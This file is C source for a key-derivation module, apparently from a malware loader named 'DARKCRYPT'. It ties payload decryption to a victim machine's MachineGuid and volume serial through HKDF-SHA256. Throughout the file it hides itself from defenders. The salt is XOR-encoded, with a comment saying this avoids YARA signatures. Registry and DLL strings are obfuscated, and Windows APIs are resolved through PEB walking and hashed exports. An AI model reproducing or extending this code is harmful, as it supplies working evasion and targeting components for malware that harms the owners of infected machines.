/*
 * keyderive.c -- per-execution AES/MAC key derivation (F9)
 *
 * Derives a 32-byte AES key and a 32-byte HMAC key at runtime from a machine
 * fingerprint (HKLM\SOFTWARE\Microsoft\Cryptography\MachineGuid + C: volume
 * serial) and an embedded 16-byte salt, using HKDF-SHA256 (RFC 5869).
 *
 * The Windows-only keyderive_derive() resolves advapi32 via PEB-walked
 * LoadLibraryA (advapi32 is not in the PEB position walk) and reads the
 * registry + volume serial using hash-resolved exports.
 * keyderive_fingerprint_from() and keyderive_hkdf() are pure computation
 * and compile/run on Linux (no Windows headers needed).
 */
#include "keyderive.h"
#include "hmac.h"
#include <stdint.h>
#include <stddef.h>

/* R8: when built with -DDARKCRYPT_BUILD_ID (release-random target), pull in
 * the auto-generated 16-byte BUILD_ID so keyderive_derive_from_fingerprint
 * can mix it into the HKDF salt. aes-main.c includes the same header. */
#ifdef DARKCRYPT_BUILD_ID
#include "build_id.h"
#endif

#ifdef _WIN32
#include <windows.h>
#include "peb.h"
#include "obfuscation.h"
#endif

/* ------------------------------------------------------------------ *
 *  Portable helpers (compile on Linux too, where we don't pull string.h
 *  or obfuscation.h).  Small local byte-copy / zero so the HKDF and
 *  fingerprint code stay dependency-free.
 * ------------------------------------------------------------------ */
/* N3: plain byte-copy, intentionally NON-volatile (it's a copy, not a wipe).
 * The compiler cannot optimize this away in practice because `dst` is always
 * a local stack buffer that's subsequently passed to hmac_sha256 (external
 * call = escape point). kd_zero below IS volatile because it's a wipe. */
static void kd_memcpy(uint8_t *dst, const uint8_t *src, size_t n)
{
    for (size_t i = 0; i < n; i++) dst[i] = src[i];
}

static void kd_zero(uint8_t *p, size_t n)
{
    volatile uint8_t *v = (volatile uint8_t *)p;
    for (size_t i = 0; i < n; i++) v[i] = 0;
}

/* ------------------------------------------------------------------ *
 *  Embedded salt (16 bytes).  The ONLY secret-derived material in the
 *  binary; the keys themselves are never stored.  Exposed via keyderive.h
 *  (extern) as the single source of truth — encode2aes.c uses it too (R4),
 *  eliminating the former ENC_KD_SALT duplication that had no compile-time
 *  guard against drift.
 *
 *  P3: the salt is XOR-encoded (key 0x7A) in .rdata so the raw 16-byte
 *  constant is not a static YARA signature. keyderive_get_salt() decodes
 *  it into a caller-provided 16-byte buffer on demand. Callers that need
 *  the salt call keyderive_get_salt() instead of reading KD_SALT directly.
 * ------------------------------------------------------------------ */
static const uint8_t KD_SALT_KEY[8] = { 0x3A, 0x4C, 0xAC, 0x4B, 0xB2, 0x83, 0xF2, 0xCD };
static const uint8_t KD_SALT_ENC[16] = {
    0xA6, 0x06, 0x82, 0xFA, 0x65, 0x8C, 0x91, 0x65,
    0x61, 0xAF, 0xB0, 0x32, 0x46, 0xEE, 0xD8, 0x43
};

/* P3: decode the salt into the caller's 16-byte buffer (volatile wipe not
 * needed — the salt is not secret, it just shouldn't be a static sig). */
void keyderive_get_salt(uint8_t out[16])
{
    for (int i = 0; i < 16; i++)
        out[i] = KD_SALT_ENC[i] ^ KD_SALT_KEY[i % 8];
}
/* ------------------------------------------------------------------ *
 *  HKDF-SHA256  (RFC 5869)  -- pure computation, Linux-portable
 *
 *  Extract: PRK = HMAC-SHA256(salt, IKM)
 *  Expand:  L = 64 bytes, info = NULL (empty), 2 blocks of 32 bytes each
 *    T(0) = empty
 *    T(1) = HMAC(PRK, T(0) || 0x01) = HMAC(PRK, 0x01)
 *    T(2) = HMAC(PRK, T(1) || 0x02)
 *    OKM  = T(1) || T(2)   (truncated to 64 = exactly 64)
 *  aes_key = OKM[0..31],  mac_key = OKM[32..63]
 * ------------------------------------------------------------------ */
void keyderive_hkdf(const uint8_t *ikm, size_t ikm_len,
                     const uint8_t *salt, size_t salt_len,
                     uint8_t aes_key[32], uint8_t mac_key[32])
{
    uint8_t prk[32];     /* pseudo-random key: HMAC(salt, IKM)         */
    uint8_t t1[32];     /* T(1) = HMAC(PRK, 0x01)                     */
    uint8_t t2[32];     /* T(2) = HMAC(PRK, T(1) || 0x02)             */
    uint8_t blk[33];    /* working buffer: prev-T || counter byte      */
    uint8_t okm[64];    /* expanded key material: T(1) || T(2)         */

    /* ---- Extract: PRK = HMAC-SHA256(salt, IKM) ---- */
    hmac_sha256(salt, salt_len, ikm, ikm_len, prk);

    /* ---- Expand: T(1) = HMAC(PRK, T(0)||0x01), T(0) empty ---- */
    blk[0] = 0x01;
    hmac_sha256(prk, 32, blk, 1, t1);

    /* ---- T(2) = HMAC(PRK, T(1)||0x02) ---- */
    kd_memcpy(blk, t1, 32);
    blk[32] = 0x02;
    hmac_sha256(prk, 32, blk, 33, t2);

    /* ---- OKM = T(1) || T(2), split into the two keys ---- */
    kd_memcpy(okm,       t1, 32);
    kd_memcpy(okm + 32,  t2, 32);
    kd_memcpy(aes_key,   okm,      32);
    kd_memcpy(mac_key,   okm + 32, 32);

    /* wipe all intermediates */
    kd_zero(prk, sizeof(prk));
    kd_zero(t1,  sizeof(t1));
    kd_zero(t2,  sizeof(t2));
    kd_zero(blk, sizeof(blk));
    kd_zero(okm, sizeof(okm));
}

/* ------------------------------------------------------------------ *
 *  keyderive_fingerprint_from  -- pure bytes, Linux-portable
 *
 *  Assembles the 64-byte fingerprint: MachineGuid string (null-stripped,
 *  up to 38 bytes) then the 4-byte volume serial (little-endian) at
 *  bytes 38..41, zero-filled to 64.
 * ------------------------------------------------------------------ */
void keyderive_fingerprint_from(const char *machine_guid, uint32_t vol_serial,
                                uint8_t out[64])
{
    size_t i;

    /* zero the whole 64-byte buffer first */
    for (i = 0; i < 64; i++) out[i] = 0;

    /* copy the guid string, stripping the NUL, up to 38 bytes */
    if (machine_guid) {
        for (i = 0; i < 38 && machine_guid[i] != '\0'; i++)
            out[i] = (uint8_t)machine_guid[i];
    }

    /* volume serial, little-endian, at bytes 38..41 */
    out[38] = (uint8_t)(vol_serial         & 0xFF);
    out[39] = (uint8_t)((vol_serial >> 8)  & 0xFF);
    out[40] = (uint8_t)((vol_serial >> 16) & 0xFF);
    out[41] = (uint8_t)((vol_serial >> 24) & 0xFF);
}

/* ------------------------------------------------------------------ *
 *  keyderive_derive_from_fingerprint  -- shared derivation path (R4/R8)
 *
 *  Derives the AES + MAC keys from a 64-byte fingerprint using the embedded
 *  KD_SALT. When DARKCRYPT_BUILD_ID is defined at build time (release-random
 *  target), the 16-byte BUILD_ID is appended to the salt (32 bytes total) so
 *  the HKDF extract mixes in per-build entropy — a payload built for machine X
 *  with build B then only decrypts on machine X running build B (R8 per-build
 *  salt). Without DARKCRYPT_BUILD_ID, the salt is the 16-byte KD_SALT alone
 *  (backward compatible with standard/nocrt builds).
 *
 *  Pure computation (Linux-portable). Used by:
 *    - the loader:  keyderive_derive() assembles the fingerprint on-target then
 *                  calls this.
 *    - the encoder: encode2aes.c --derive mode calls this with a fingerprint
 *                  reconstructed from the operator-supplied MachineGuid +
 *                  volume serial (+ optional --build-id).
 * ------------------------------------------------------------------ */
void keyderive_derive_from_fingerprint(const uint8_t fingerprint[64],
                                       uint8_t aes_key[32],
                                       uint8_t mac_key[32])
{
#ifdef DARKCRYPT_BUILD_ID
    /* R8: mix the 16-byte BUILD_ID into the salt. BUILD_ID is defined (static
     * const, in a .buildid section) by build_id.h, included at file scope under
     * -DDARKCRYPT_BUILD_ID. Two builds of the same source differ in BUILD_ID,
     * so a payload tied to build B's salt won't decrypt under build A. */
    uint8_t salt[KD_SALT_LEN + 16];
    keyderive_get_salt(salt);
    kd_memcpy(salt + KD_SALT_LEN, BUILD_ID, 16);
    keyderive_hkdf(fingerprint, 64, salt, sizeof(salt), aes_key, mac_key);
    kd_zero(salt, sizeof(salt));
#else
    uint8_t salt[KD_SALT_LEN];
    keyderive_get_salt(salt);
    keyderive_hkdf(fingerprint, 64, salt, KD_SALT_LEN, aes_key, mac_key);
    kd_zero(salt, sizeof(salt));
#endif
}
/* ------------------------------------------------------------------ *
 *  XOR-encoded strings (key 0x37).  Decoded onto the stack at runtime so
 *  no plaintext "SOFTWARE\\Microsoft\\Cryptography" / "MachineGuid" /
 *  "advapi32.dll" leaks in .rdata.  Windows-only.
 * ------------------------------------------------------------------ */
#ifdef _WIN32

/* "SOFTWARE\\Microsoft\\Cryptography" (31 chars) ^ 0x37 */
static const uint8_t ENC_KEY_SUBKEY[8] = { 0xf6, 0x43, 0xa7, 0x09, 0xc6, 0xc4, 0xb0, 0xe7 };
static const uint8_t ENC_SUBKEY[33] = {
    0xa5, 0x0c, 0xe1, 0x5d, 0x91, 0x85, 0xe2, 0xa2,
    0xaa, 0x1f, 0xea, 0x60, 0xa5, 0xb6, 0xdf, 0x94,
    0x99, 0x25, 0xd3, 0x55, 0x9a, 0x87, 0xc2, 0x9e,
    0x86, 0x37, 0xc8, 0x6e, 0xb4, 0xa5, 0xc0, 0x8f, 0x8f
};
#define SUBKEY_LEN 33

/* "MachineGuid" (11 chars) ^ 0x37 */
static const uint8_t ENC_KEY_VALNAME[6] = { 0xef, 0x19, 0x59, 0xf0, 0x91, 0x46 };
static const uint8_t ENC_VALNAME[11] = {
    0xa2, 0x78, 0x3a, 0x98, 0xf8, 0x28, 0x8a, 0x5e, 0x2c, 0x99, 0xf5
};
#define VALNAME_LEN 11

/* "advapi32.dll" (12 chars) ^ 0x37 */
static const uint8_t ENC_KEY_ADVAPIO[6] = { 0x3b, 0x55, 0x29, 0xe7, 0xf7, 0x25 };
static const uint8_t ENC_ADVAPIO[12] = {
    0x5a, 0x31, 0x5f, 0x86, 0x87, 0x4c, 0x08, 0x67, 0x07, 0x83, 0x9b, 0x49
};
#define ADVAPIO_LEN 12

/* "C:\\" (3 chars) ^ 0x37 */
static const uint8_t ENC_KEY_DRIVE[3] = { 0x1b, 0xf8, 0x8b };
static const uint8_t ENC_DRIVE[4] = {
    0x58, 0xc2, 0xd7, 0x47
};
#define DRIVE_LEN 4

/* Function pointer typedefs for the advapi32 / kernel32 APIs we resolve. */
typedef LONG  (WINAPI *pfn_RegOpenKeyExA)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
typedef LONG  (WINAPI *pfn_RegQueryValueExA)(HKEY, LPCSTR, LPDWORD, LPDWORD,
                                             LPBYTE, LPDWORD);
typedef LONG  (WINAPI *pfn_RegCloseKey)(HKEY);
typedef BOOL  (WINAPI *pfn_GetVolumeInformationA)(LPCSTR, LPSTR, DWORD,
          LPDWORD, LPDWORD, LPDWORD, LPSTR, DWORD);
typedef HMODULE (WINAPI *pfn_LoadLibraryA)(LPCSTR);
/* ------------------------------------------------------------------ *
 *  keyderive_derive  -- Windows-only
 *
 *  Reads MachineGuid from the registry and the C: volume serial, builds
 *  the 64-byte fingerprint, runs HKDF-SHA256, returns the two 32-byte
 *  keys.  Returns 0 on success, non-zero on failure (fail-closed).
 * ------------------------------------------------------------------ */
int keyderive_derive(uint8_t aes_key[32], uint8_t mac_key[32])
{
    uint8_t  fingerprint[64];
    char     guid_buf[40];
    char     subkey[SUBKEY_LEN + 1];
    char     valname[VALNAME_LEN + 1];
    char     advapi_name[ADVAPIO_LEN + 1];
    char     drive[DRIVE_LEN + 1];
    HKEY     hKey = NULL;
    DWORD    vol_serial = 0;
    DWORD    fs_flags = 0, max_comp = 0;
    DWORD    guid_type = 0, guid_size = sizeof(guid_buf);
    LONG     status;
    int      rc = 1;                 /* fail-closed default */
    HMODULE  advapi32_base = NULL;
    pfn_RegOpenKeyExA         pRegOpenKeyExA    = NULL;
    pfn_RegQueryValueExA      pRegQueryValueExA = NULL;
    pfn_RegCloseKey           pRegCloseKey       = NULL;
    pfn_GetVolumeInformationA pGetVolInfo       = NULL;
    pfn_LoadLibraryA          pLoadLibraryA     = NULL;

    /* wipe stack buffers up front */
    secure_zero(fingerprint, sizeof(fingerprint));
    secure_zero(guid_buf,    sizeof(guid_buf));
    secure_zero(subkey,      sizeof(subkey));
    secure_zero(valname,     sizeof(valname));
    secure_zero(advapi_name, sizeof(advapi_name));
    secure_zero(drive,       sizeof(drive));

    /* ---- 1. resolve LoadLibraryA from kernel32 (PEB-walked) ---- */
    pLoadLibraryA = (pfn_LoadLibraryA)peb_resolve_kernel32(HASH_LoadLibraryA);
    if (!pLoadLibraryA) goto cleanup;

    /* ---- 2. XOR-decode "advapi32.dll" and LoadLibraryA it ---- */
    xor_dec_mb(advapi_name, ENC_ADVAPIO, ADVAPIO_LEN, ENC_KEY_ADVAPIO, 6);
    advapi32_base = pLoadLibraryA(advapi_name);
    secure_zero(advapi_name, sizeof(advapi_name));
    if (!advapi32_base) goto cleanup;

    /* ---- 3. resolve registry APIs from advapi32 by hash ---- */
    pRegOpenKeyExA    = (pfn_RegOpenKeyExA)
        peb_find_export(advapi32_base, HASH_RegOpenKeyExA);
    pRegQueryValueExA = (pfn_RegQueryValueExA)
        peb_find_export(advapi32_base, HASH_RegQueryValueExA);
    pRegCloseKey      = (pfn_RegCloseKey)
        peb_find_export(advapi32_base, HASH_RegCloseKey);
    if (!pRegOpenKeyExA || !pRegQueryValueExA || !pRegCloseKey) goto cleanup;

    /* ---- 4. XOR-decode the registry subkey and value name ---- */
    xor_dec_mb(subkey,  ENC_SUBKEY,  SUBKEY_LEN,  ENC_KEY_SUBKEY, 8);
    xor_dec_mb(valname, ENC_VALNAME, VALNAME_LEN, ENC_KEY_VALNAME, 6);

    /* ---- 5. open HKLM\SOFTWARE\Microsoft\Cryptography ---- */
    status = pRegOpenKeyExA(HKEY_LOCAL_MACHINE, subkey, 0,
                            KEY_QUERY_VALUE, &hKey);
    if (status != ERROR_SUCCESS) goto cleanup;

    /* ---- 6. query MachineGuid (a REG_SZ string) ---- */
    guid_size = sizeof(guid_buf);
    status = pRegQueryValueExA(hKey, valname, NULL, &guid_type,
                               (LPBYTE)guid_buf, &guid_size);
    if (status != ERROR_SUCCESS || guid_type != REG_SZ) {
        pRegCloseKey(hKey);
        hKey = NULL;
        goto cleanup;
    }

    /* ---- 7. close the key ---- */
    pRegCloseKey(hKey);
    hKey = NULL;

    /* wipe decoded strings now that we're done with them */
    secure_zero(subkey,  sizeof(subkey));
    secure_zero(valname, sizeof(valname));

    /* ---- 8. resolve GetVolumeInformationA from kernel32 ---- */
    pGetVolInfo = (pfn_GetVolumeInformationA)
        peb_resolve_kernel32(HASH_GetVolumeInformationA);
    if (!pGetVolInfo) goto cleanup;

    /* ---- 9. build "C:\\" on the stack, read the volume serial ---- */
    xor_dec_mb(drive, ENC_DRIVE, DRIVE_LEN, ENC_KEY_DRIVE, 3);
    if (!pGetVolInfo(drive, NULL, 0, &vol_serial, &max_comp,
                     &fs_flags, NULL, 0))
        goto cleanup;
    secure_zero(drive, sizeof(drive));

    /* ---- 10. assemble the 64-byte fingerprint ---- */
    keyderive_fingerprint_from(guid_buf, vol_serial, fingerprint);

    /* ---- 11. HKDF-SHA256 -> aes_key + mac_key ----
     * R4/R8: use the shared derivation path (mixes in BUILD_ID when the
     * build was compiled with -DDARKCRYPT_BUILD_ID). */
    keyderive_derive_from_fingerprint(fingerprint, aes_key, mac_key);
    rc = 0;   /* success */

cleanup:
    if (hKey) pRegCloseKey(hKey);
    secure_zero(fingerprint, sizeof(fingerprint));
    secure_zero(guid_buf,    sizeof(guid_buf));
    secure_zero(subkey,      sizeof(subkey));
    secure_zero(valname,     sizeof(valname));
    secure_zero(advapi_name, sizeof(advapi_name));
    secure_zero(drive,       sizeof(drive));
    return rc;
}

#else  /* !_WIN32 -- Linux stub (no registry / volume API) */

int keyderive_derive(uint8_t aes_key[32], uint8_t mac_key[32])
{
    (void)aes_key;
    (void)mac_key;
    return 1;   /* fail-closed: no fingerprint available on Linux */
}

#endif /* _WIN32 */